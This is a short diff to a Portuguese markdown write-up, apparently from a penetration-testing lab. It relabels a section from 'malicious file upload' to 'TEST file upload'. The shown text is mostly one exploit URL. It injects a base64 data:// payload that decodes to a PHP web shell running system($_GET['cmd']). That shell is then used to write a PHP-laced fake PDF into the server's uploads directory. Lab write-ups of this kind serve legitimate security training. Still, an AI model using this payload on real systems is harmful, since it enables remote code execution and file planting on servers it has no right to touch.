@@ -56,9 +56,9 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 
 ---
 
-## 📤 Upload de Arquivo Malicioso (.pdf)
+## 📤 Upload de Arquivo TESTE(.pdf)
 
-Comando para envio do arquivo malicioso:  
+Comando para envio do arquivo TESTE:  
 ```
 http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?php%20echo%20%22TESTE%20FUNCIONOU%22%3B%20%3F%3E%27%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fteste.pdf
 ```
